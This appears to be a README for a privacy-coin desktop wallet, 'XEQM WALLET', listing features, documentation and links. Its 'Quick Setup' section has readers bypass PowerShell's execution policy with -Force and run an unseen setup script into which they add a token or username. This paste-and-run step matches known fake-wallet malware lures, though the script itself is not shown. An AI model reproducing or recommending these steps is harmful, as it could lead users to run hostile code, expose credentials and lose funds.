# XEQM WALLET

The official open-source desktop wallet for the XEQM privacy network.

![Website](https://img.shields.io/badge/website-xeqmwallet.com-blue)
![License](https://img.shields.io/badge/license-GPL--3.0-green)
![Docs](https://img.shields.io/badge/docs-7_articles-informational)
![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)

---

## Quick Setup

Download the zip, unzip it into your Downloads folder, then copy-paste everything below into PowerShell.

```powershell
cd $env:USERPROFILE\Downloads\xeqmwallet-github-windows-setup
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
notepad .\github-setup.ps1
.\github-setup.ps1
```

Notepad will open the script so you can add your token/username if needed — save and close it, then the run continues.

---

## Table of Contents

- [What is XEQM WALLET](#what-is-xeqm-wallet)
- [Features](#features)
- [Documentation](#documentation)
- [Resources](#resources)
- [About](#about)

---

## What is XEQM WALLET

XEQM WALLET is the official desktop client for XEQM, a privacy-first cryptocurrency network descended from the Monero and Equilibria (XEQ) codebases. It's non-custodial software — your keys are generated on your own machine and never leave it. There's no XEQM-branded hardware, no browser extension, and no mobile app; "XEQM WALLET" refers specifically to the desktop application distributed from [xeqmwallet.com](https://xeqmwallet.com/).

Every transaction on the network uses ring signatures, stealth addresses, and RingCT with Bulletproofs+ to keep the sender, recipient, and amount private by default — there's no "transparent mode" to accidentally leave on. The wallet also runs a full node, exposes an inline staking flow for XEQM's service-node layer, and ships identically across Windows, macOS, and Linux. The whole stack is GPL-3.0 licensed and published on GitHub for anyone to audit.

## Features

| Feature | Description | Learn more |
|---|---|---|
| Self-custody | Seed phrase generated and stored locally; no account or KYC | [Getting Started](https://xeqmwallet.com/getting-started) |
| Always-on privacy | Ring signatures, stealth addresses, RingCT, and Bulletproofs+ on every transaction | [Security](https://xeqmwallet.com/security) |
| Subaddresses | Unlimited receiving addresses from a single seed | [Features](https://xeqmwallet.com/features) |
| Send / Receive | Local fee estimation, address book, confirmation tracking | [Send & Receive](https://xeqmwallet.com/send-receive) |
| Service-node staking | Lock 200,000 XEQM (solo) or ~20,000 XEQM (pool) directly from the wallet | [Service Nodes](https://xeqmwallet.com/service-nodes) |
| Wrap to WXEQ | Move XEQM into EVM-based DeFi via a two-way wrap/unwrap bridge | [Wrap & Stake](https://xeqmwallet.com/wrap-stake) |
| XEQ → XEQM migration | Proof-of-burn swap for legacy Equilibria holders | [Migration](https://xeqmwallet.com/migration) |
| Zero telemetry | No analytics SDK, no phone-home, no remote kill switch | [Security](https://xeqmwallet.com/security) |

---

## Documentation

**Getting Started**
- [Getting Started with XEQM WALLET](docs/getting-started.md)

**Concepts**
- [Understanding XEQM's Privacy Model](docs/security-privacy-model.md)
- [Sending and Receiving XEQM](docs/send-receive-guide.md)

**Staking & DeFi**
- [Staking XEQM: Service Nodes Explained](docs/service-node-staking.md)
- [Wrapping XEQM into WXEQ for DeFi](docs/wrap-stake-wxeq.md)

**Migration & Support**
- [Migrating from Legacy XEQ to XEQM](docs/xeq-to-xeqm-migration.md)
- [Troubleshooting & Getting Help](docs/troubleshooting-support.md)

---

## Resources

**Core pages**
- [Home](https://xeqmwallet.com/)
- [Features](https://xeqmwallet.com/features)
- [Download](https://xeqmwallet.com/download)
- [FAQ](https://xeqmwallet.com/faq)

**Setup & transactions**
- [Getting Started](https://xeqmwallet.com/getting-started)
- [Send & Receive](https://xeqmwallet.com/send-receive)
- [Troubleshooting](https://xeqmwallet.com/troubleshooting)
- [Support](https://xeqmwallet.com/support)

**Staking, DeFi & migration**
- [Service Nodes](https://xeqmwallet.com/service-nodes)
- [Wrap & Stake](https://xeqmwallet.com/wrap-stake)
- [Migration (XEQ → XEQM)](https://xeqmwallet.com/migration)

**Security**
- [Security & Cryptography](https://xeqmwallet.com/security)

---

## About

XEQM WALLET is maintained by XEQM Labs, the team formerly behind the Equilibria (XEQ) project. Source code, releases, and issue tracking live on the [xeqmwallet GitHub organization](https://github.com/xeqmwallet). The wallet is free, open-source (GPL-3.0), and has no premium tier — the only cost of using the network is the standard per-transaction fee paid to miners and service nodes.
